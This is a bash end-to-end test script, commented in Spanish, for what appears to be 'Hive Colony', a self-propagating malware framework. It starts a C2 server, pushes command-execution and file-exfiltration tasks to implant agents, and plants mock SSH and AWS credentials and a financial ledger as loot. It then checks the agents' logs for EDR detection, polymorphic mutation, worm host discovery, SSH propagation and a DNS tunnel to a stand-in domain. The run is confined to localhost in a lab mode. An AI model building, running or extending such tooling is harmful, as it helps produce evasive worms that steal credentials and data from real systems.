#!/usr/bin/env bash
# Hive Colony End-to-End Verification
# Prueba TODO de verdad: agentes, arena, C2, exfil, propagación
set -euo pipefail

HIVE_BIN="target/release"
ARENA_NAME="hive_verify_$(date +%s)"
C2_PORT=${C2_PORT:-8445}
C2_URL="http://127.0.0.1:${C2_PORT}"
LOOT_DIR="/tmp/hive_verify_loot_$$"
DB_PATH="/tmp/hive_verify_$$.db"
PID_FILE="/tmp/hive_verify_pids_$$"
PASS=0
FAIL=0
TIMEOUT=60  # max seconds to wait for each agent

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
pass() { echo -e "  ${GREEN}PASS${NC}: $1"; PASS=$((PASS + 1)); }
fail() { echo -e "  ${RED}FAIL${NC}: $1"; FAIL=$((FAIL + 1)); }
info() { echo -e "${CYAN}[*]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }

cleanup() {
    info "Limpiando..."
    if [ -f "$PID_FILE" ]; then
        while read -r pid; do kill "$pid" 2>/dev/null || true; done < "$PID_FILE"
        rm -f "$PID_FILE"
    fi
    pkill -f "c2-server.*--port $C2_PORT" 2>/dev/null || true
    rm -f "/dev/shm/${ARENA_NAME}" 2>/dev/null || true
    rm -rf "$LOOT_DIR" "$DB_PATH"
}
trap cleanup EXIT

assert_pid_alive() {
    local desc="$1" pid="$2" name="$3"
    if kill -0 "$pid" 2>/dev/null; then
        pass "$desc ($name PID $pid)"
        return 0
    else
        fail "$desc ($name murió)"
        return 1
    fi
}

wait_for_log() {
    local logfile="$1" pattern="$2" timeout_secs="${3:-$TIMEOUT}" desc="$4"
    local waited=0
    while [ $waited -lt $timeout_secs ]; do
        if [ -f "$logfile" ] && grep -q "$pattern" "$logfile" 2>/dev/null; then
            pass "$desc"
            return 0
        fi
        sleep 1
        waited=$((waited + 1))
    done
    fail "$desc (timeout ${timeout_secs}s, pattern: '$pattern')"
    warn "Últimas 10 líneas de $logfile:"
    tail -10 "$logfile" 2>/dev/null | sed 's/^/    /'
    return 1
}

# ===== SETUP =====
echo "╔══════════════════════════════════════════════════╗"
echo "║   HIVE COLONY — VERIFICACIÓN END-TO-END REAL    ║"
echo "╚══════════════════════════════════════════════════╝"
echo ""

# 1. Verificar bins compilados
info "Paso 0: Verificando binarios compilados..."
for bin in c2-server queen worker drone honeybee weaver swarm; do
    if [ ! -f "$HIVE_BIN/$bin" ]; then
        fail "Binario faltante: $HIVE_BIN/$bin"
        info "Ejecutá: cargo build --release -p $bin"
        exit 1
    fi
done
pass "Todos los binarios existen en $HIVE_BIN/"

# 2. Preparar mock data para honeybee
info "Paso 0.5: Preparando datos mock para exfiltración..."
mkdir -p /tmp/verify_target/Documents /tmp/verify_target/.ssh /tmp/verify_target/.aws /tmp/verify_target/financial_data
echo 'account,balance,date' > /tmp/verify_target/financial_data/ledger.csv
echo '1001,1250000,2024-01-15' >> /tmp/verify_target/financial_data/ledger.csv
echo '1002,3400000,2024-01-14' >> /tmp/verify_target/financial_data/ledger.csv
echo 'export AWS_KEY=AKIA123456789' > /tmp/verify_target/.aws/credentials
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' > /tmp/verify_target/.ssh/id_rsa
echo '<?php $dbpass="pass123"; ?>' > /tmp/verify_target/Documents/config.php
pass "Datos mock listos en /tmp/verify_target/"

# 3. Iniciar C2 Server
info "Paso 1: Iniciando C2 Server..."
rm -rf "$LOOT_DIR" "$DB_PATH"
mkdir -p "$LOOT_DIR"
setsid "$HIVE_BIN/c2-server" --port "$C2_PORT" --loot-dir "$LOOT_DIR" --db-path "$DB_PATH" \
    < /dev/null > /tmp/hive_verify_c2.log 2>&1 &
C2_PID=$!
echo "$C2_PID" > "$PID_FILE"

# Esperar a que C2 esté listo
C2_READY=false
for i in $(seq 1 15); do
    sleep 1
    if curl -sf "$C2_URL/health" > /dev/null 2>&1; then
        C2_READY=true
        break
    fi
done
if $C2_READY; then
    pass "C2 Server iniciado (PID $C2_PID, puerto $C2_PORT)"
else
    fail "C2 Server no respondió en 15s"
    tail -20 /tmp/hive_verify_c2.log
    exit 1
fi

# 4. Test endpoints C2
info "Paso 2: Verificando endpoints C2..."

# 4a. Health
HEALTH=$(curl -sf "$C2_URL/health" 2>/dev/null || echo "")
if echo "$HEALTH" | grep -q "ok"; then
    pass "C2 endpoint /health"
else
    fail "C2 endpoint /health (respuesta: $HEALTH)"
fi

# 4b. Beacon
BEACON=$(curl -sf -X POST "$C2_URL/beacon" \
    -H "X-Agent-ID: verify-queen-001" \
    -H "X-Agent-Role: queen" \
    -d '{"hostname":"verify-host","username":"root","os":"linux","version":"3.0.0"}' 2>/dev/null || echo "")
if echo "$BEACON" | grep -q "ack"; then
    pass "C2 endpoint /beacon (queen)"
else
    fail "C2 endpoint /beacon (respuesta: $BEACON)"
fi

# 4c. Collect
COLLECT=$(curl -sf -X POST "$C2_URL/collect" \
    -H "X-Agent-ID: verify-honeybee-001" \
    -H "X-Agent-Role: honeybee" \
    -H "X-File-Name: verify_test.txt" \
    -d "HIVE_VERIFY_DATA_$(date +%s)" 2>/dev/null || echo "")
if echo "$COLLECT" | grep -q "received"; then
    pass "C2 endpoint /collect"
else
    fail "C2 endpoint /collect (respuesta: $COLLECT)"
fi

# 4d. Task push/pull
TASK_PUSH=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "$C2_URL/task/verify-queen-001" \
    -H "Content-Type: application/json" \
    -d '{"id":"vt1","command":"exec","payload":{"cmd":"id"}}' 2>/dev/null || echo "")
if [ "$TASK_PUSH" = "201" ]; then
    pass "C2 endpoint /task (push)"
else
    fail "C2 endpoint /task push (HTTP $TASK_PUSH)"
fi

TASK_PULL=$(curl -sf "$C2_URL/task/verify-queen-001" 2>/dev/null || echo "")
if echo "$TASK_PULL" | grep -q "vt1"; then
    pass "C2 endpoint /task (pull)"
else
    fail "C2 endpoint /task pull"
fi

# 4e. Admin agents
AGENTS=$(curl -sf "$C2_URL/admin/agents" 2>/dev/null || echo "")
if echo "$AGENTS" | grep -q "verify-queen-001"; then
    pass "C2 endpoint /admin/agents (verify-queen-001 aparece)"
else
    fail "C2 endpoint /admin/agents (verify-queen-001 no aparece)"
    info "Respuesta: $AGENTS"
fi

# ===== COLONY LAUNCH =====
info "Paso 3: Lanzando colonia (todos los agentes)..."
export __HIVE_ARENA="$ARENA_NAME"
export HIVE_LAB_MODE=1
export RUST_LOG=info
export HIVE_C2_URL="http://127.0.0.1:${C2_PORT}/collect"
export HIVE_C2_DNS_DOMAIN="tunnel.example.com"
export HIVE_C2_ICMP_TARGET="127.0.0.1"
export HIVE_TELEMETRY_DIR="/tmp/hive_verify_telemetry"

mkdir -p "$HIVE_TELEMETRY_DIR"
declare -A AGENT_PIDS
AGENT_LIST=(queen worker drone honeybee weaver swarm)

for agent in "${AGENT_LIST[@]}"; do
    setsid "$HIVE_BIN/$agent" < /dev/null > "/tmp/hive_verify_${agent}.log" 2>&1 &
    AGENT_PIDS[$agent]=$!
    echo "$!" >> "$PID_FILE"
    info "  $agent iniciado (PID $!)"
    sleep 0.3
done

# Esperar que los agentes se estabilicen
sleep 3
echo ""

# ===== VERIFICACIÓN AGENTES =====
info "Paso 4: Verificando que los agentes están vivos..."
for agent in "${AGENT_LIST[@]}"; do
    assert_pid_alive "$agent corriendo" "${AGENT_PIDS[$agent]}" "$agent" || true
done

# Esperar heartbeats
info "Paso 5: Verificando heartbeats en arena..."
sleep 3
if [ -f "/dev/shm/${ARENA_NAME}" ] || [ -e "/dev/shm/${ARENA_NAME}" ]; then
    ARENA_SIZE=$(stat -c%s "/dev/shm/${ARENA_NAME}" 2>/dev/null || echo "unknown")
    pass "Arena existe en /dev/shm/${ARENA_NAME} (size: $ARENA_SIZE)"
else
    fail "Arena NO encontrada en /dev/shm/${ARENA_NAME}"
fi

# 5a. Queen: heartbeat, seer, phoenix
info "Paso 5a: Verificando Queen..."
wait_for_log "/tmp/hive_verify_queen.log" "heartbeat" 30 "Queen: heartbeat enviado" || true
wait_for_log "/tmp/hive_verify_queen.log" "OvermindAgent" 15 "Queen: OvermindAgent inicializado" || true

# 5b. Worker: profiling, EDR detection
info "Paso 5b: Verificando Worker..."
wait_for_log "/tmp/hive_verify_worker.log" "ScoutAgent" 15 "Worker: ScoutAgent inicializado" || true
wait_for_log "/tmp/hive_verify_worker.log" "profile" 30 "Worker: system profile recolectado" || true
wait_for_log "/tmp/hive_verify_worker.log" "edr" 45 "Worker: detección EDR" || true

# 5c. Drone: stigmergy, propagation decisions
info "Paso 5c: Verificando Drone..."
wait_for_log "/tmp/hive_verify_drone.log" "DroneAgent" 15 "Drone: DroneAgent inicializado" || true
wait_for_log "/tmp/hive_verify_drone.log" "ShaperAction" 30 "Drone: decisión de propagación" || true

# 5d. Honeybee: file discovery, exfil
info "Paso 5d: Verificando Honeybee..."
wait_for_log "/tmp/hive_verify_honeybee.log" "HoarderAgent" 15 "Honeybee: HoarderAgent inicializado" || true
wait_for_log "/tmp/hive_verify_honeybee.log" "discover" 30 "Honeybee: descubrimiento de archivos" || true

# 5e. Weaver: mutations, polymorphism
info "Paso 5e: Verificando Weaver..."
wait_for_log "/tmp/hive_verify_weaver.log" "WeaverAgent" 15 "Weaver: WeaverAgent inicializado" || true
wait_for_log "/tmp/hive_verify_weaver.log" "mutation" 30 "Weaver: generación de mutaciones" || true

# 5f. Swarm: discovery, worm limits
info "Paso 5f: Verificando Swarm..."
wait_for_log "/tmp/hive_verify_swarm.log" "WormAgent" 15 "Swarm: WormAgent inicializado" || true
wait_for_log "/tmp/hive_verify_swarm.log" "discover" 30 "Swarm: descubrimiento de hosts" || true

# ===== TEST ARENA IPC =====
info "Paso 6: Verificando IPC inter-agentes..."
# Verificar que múltiples agentes están registrados en arena
# (Leemos el log de queen para ver si detecta otros agentes)
wait_for_log "/tmp/hive_verify_queen.log" "worker" 30 "Queen detecta Worker en arena" || true
wait_for_log "/tmp/hive_verify_queen.log" "drone" 30 "Queen detecta Drone en arena" || true
wait_for_log "/tmp/hive_verify_queen.log" "honeybee" 30 "Queen detecta Honeybee en arena" || true

# ===== TEST EXFILTRACIÓN REAL =====
info "Paso 7: Verificando exfiltración real..."

# Forzar honeybee a exfiltrar un archivo escribiendo una creencia
# Honeybee monitorea beliefs nuevos, podemos escribirle una tarea
TASK_EXFIL=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "$C2_URL/task/verify-honeybee-001" \
    -H "Content-Type: application/json" \
    -d '{"id":"vexfil1","command":"exfil","payload":{"path":"/tmp/verify_target/financial_data/ledger.csv","filename":"ledger_exfil.csv"}}' 2>/dev/null || echo "")
if [ "$TASK_EXFIL" = "201" ]; then
    pass "Tarea de exfiltración creada en C2"
else
    warn "No se pudo crear tarea de exfil (HTTP $TASK_EXFIL) — honeybee puede no tener task pull implementado"
fi

# ===== TEST C2 LOOT =====
info "Paso 8: Verificando loot en C2..."
LOOT_FILES=$(ls "$LOOT_DIR"/verify_test* 2>/dev/null || echo "")
if [ -n "$LOOT_FILES" ]; then
    pass "Archivo exfiltrado encontrado en loot: $LOOT_FILES"
    cat "$LOOT_FILES" 2>/dev/null | head -3 | sed 's/^/    /'
else
    fail "No se encontró archivo exfiltrado en $LOOT_DIR"
    info "Contenido de loot dir:"
    ls -la "$LOOT_DIR" 2>/dev/null | sed 's/^/    /'
fi

# ===== TEST PROPAGACIÓN (SSH local) =====
info "Paso 9: Verificando capacidades de propagación..."

# Verificar que swarm/drone tienen SSH configurado
if command -v ssh &>/dev/null; then
    pass "SSH client disponible en el sistema"
else
    warn "SSH no instalado — propagación no verificable"
fi

# Verificar que los agentes tienen la lógica de propagación compilada
if grep -q "ssh" /tmp/hive_verify_swarm.log 2>/dev/null; then
    pass "Swarm: lógica SSH detectada en logs"
else
    warn "Swarm: no se ve lógica SSH en logs (puede que no haya targets)"
fi

# ===== VERIFICACIÓN FINAL =====
echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║   RESULTADOS VERIFICACIÓN                        ║"
echo "╠══════════════════════════════════════════════════╣"
TOTAL=$((PASS + FAIL))
echo "║  TOTAL: $TOTAL tests"
echo "║  ✅ PASS: $PASS"
echo "║  ❌ FAIL: $FAIL"
echo "╚══════════════════════════════════════════════════╝"

# Resumen agente por agente
echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║   LOGS POR AGENTE (últimas 3 líneas)            ║"
echo "╚══════════════════════════════════════════════════╝"
for agent in c2-server queen worker drone honeybee weaver swarm; do
    logfile="/tmp/hive_verify_${agent}.log"
    if [ -f "$logfile" ]; then
        last_line=$(tail -1 "$logfile" 2>/dev/null | tr -d '\n' | head -c 120)
        echo "  ${agent}: $last_line"
    fi
done

[ "$FAIL" -eq 0 ] && exit 0 || exit 1
